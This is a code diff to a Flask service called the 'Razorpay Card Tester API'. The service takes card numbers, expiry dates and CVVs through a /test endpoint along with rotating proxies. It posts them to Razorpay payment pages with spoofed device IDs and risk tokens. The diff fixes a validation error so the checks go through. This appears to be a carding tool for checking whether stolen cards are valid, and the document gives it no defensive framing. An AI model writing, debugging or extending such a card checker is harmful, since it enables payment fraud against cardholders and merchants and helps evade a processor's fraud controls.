@@ -1,8 +1,9 @@
-# app.py - Fixed currency validation error
+# app.py - Fixed currency_request_id generation
 from flask import Flask, request, jsonify
 import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
 from urllib.parse import quote, urlparse, parse_qs, unquote
 import os
+import uuid
 
 urllib3.disable_warnings()
 
@@ -263,6 +264,10 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             separators=(',', ':')).encode()
         ).decode()
         
+        # Generate a unique currency_request_id - THIS IS THE FIX
+        # It needs to be a unique string, not just "INR"
+        currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
+        
         data_create = {
             "user_risk_providers_token": token_create, 
             'notes[comment]': '', 
@@ -274,8 +279,9 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'contact': PHONE, 
             'email': EMAIL, 
             'currency': 'INR',
-            # FIX: Add currency_request_id to fix the validation error
-            'currency_request_id': 'INR', 
+            # FIX: Use unique currency_request_id
+            'currency_request_id': currency_request_id,
+            'dcc_currency': 'INR',
             '_[integration]': 'payment_pages',
             '_[checkout_id]': checkout_id, 
             '_[device.id]': rzp_device_id, 
@@ -302,8 +308,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'card[name]': MEMBER_NAME,
             'card[expiry_month]': mm, 
             'card[expiry_year]': year_full,
-            'save': '0', 
-            'dcc_currency': 'INR',
+            'save': '0',
         }
         
         resp_create = session.post(
@@ -343,15 +348,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             if redirect_match:
                 result["redirect_url"] = redirect_match.group(1)
                 result["raw_json"]["redirect_url"] = redirect_match.group(1)
-            else:
-                # Look for any URL in the HTML
-                url_pattern = re.compile(r'https?://[^\s"\'<>(){}[\]]+')
-                urls = url_pattern.findall(resp_create.text)
-                for url in urls:
-                    if 'razorpay' not in url and 'cdn' not in url:
-                        result["redirect_url"] = url
-                        result["raw_json"]["redirect_url"] = url
-                        break
             
             return result
         
@@ -413,7 +409,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
 def home():
     return jsonify({
         "service": "Razorpay Card Tester API",
-        "version": "1.2",
+        "version": "1.3",
         "endpoints": {
             "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
         },
